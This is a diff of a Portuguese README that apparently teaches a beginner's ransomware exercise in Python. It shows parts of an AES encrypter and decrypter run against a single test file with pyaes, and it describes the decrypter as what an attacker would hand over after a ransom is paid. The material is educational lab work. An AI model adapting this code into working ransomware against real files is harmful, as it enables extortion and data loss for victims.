@@ -1,19 +1,19 @@
 # Criando-um-Ransomware-com-python
 
-### Ferramentas nescessaria para criação deste ransomware
+Ferramentas necessárias para criação deste ransomware
 
-- Kali Linux
-- vim
+Kali Linux
+vim
 
-### Configuração Ransoware
+Configuração Ransomware
 
-No terminal do kali linux crie um arquivo que servira de exemplo para o ataque: vim dados_teste.txt
-Dentro do aquivo dados_teste.txt adicione um dado como: "Dados importantes da minha empresa." 
-Agora crie um comando em python para encriptografar o arquivo dados_teste.txt: vim encrypter.py
+No terminal do Kali Linux, crie um arquivo que servirá de exemplo para o ataque: vim dados_teste.txt 
+Dentro do arquivo dados_teste.txt, adicione um dado como: "Dados importantes da minha empresa." 
+Agora, crie um comando em Python para criptografar o arquivo dados_teste.txt: vim encrypter.py
 
 Alimente com esses dados:
 
-comente o que cada linha faz nesse codigo python para cryptogarfar:
+Fazer um arquivo em phyton para cryptografar o arquivo dados_teste.txt: vim encrypter.py
 
 import os         # Importa o módulo 'os' para interagir com o sistema operacional.
 import pyaes      # Importa a biblioteca 'pyaes' para operações de criptografia e descriptografia.
@@ -40,7 +40,7 @@ new_file = open(f'{new_file}', 'wb')          # Abre o novo arquivo em modo de e
 new_file.write(crypto_data)                   # Escreve os dados criptografados no novo arquivo.
 new_file.close()                              # Fecha o novo arquivo.
 
-Agora fazer um arquivo para desincreptar, que o atacante forneceria para quem sofreu o ataque mediante a pagamento do resgate: vim decrypter.py:
+Agora, crie um arquivo para descriptografar, que o atacante forneceria para quem sofreu o ataque mediante o pagamento do resgate: vim decrypter.py
 
 import os        # Importa o módulo 'os' para interagir com o sistema operacional.
 import pyaes     # Importa a biblioteca 'pyaes' para operações de criptografia e descriptografia.
@@ -64,6 +64,12 @@ new_file = 'dados_teste.txt'                   # Define o nome do novo arquivo d
 new_file = open(f'{new_file}', 'wb')           # Abre o novo arquivo em modo de escrita binária.
 new_file.write(decrypt_data)                   # Escreve os dados descriptografados no novo arquivo.
 new_file.close()                               # Fecha o novo arquivo.
+
+Comandos para fazer a cryptografia e a descryptografia no terminal kali:
+
+Instalado no módulo pyaes no seu ambiente Python: pip install pyaes
+Para criptografar o arquivo dados_teste.txt: python encrypter.py
+Para descryptografar o arquivo dados_teste.txt: 
 
 ![Dados_criptografado](https://github.com/user-attachments/assets/e6da0098-7422-4eb3-afc9-8f6a2c80c331)
 ![Dados_descriptografado](https://github.com/user-attachments/assets/8d874905-c80a-4870-9f73-31a55af87ec4)
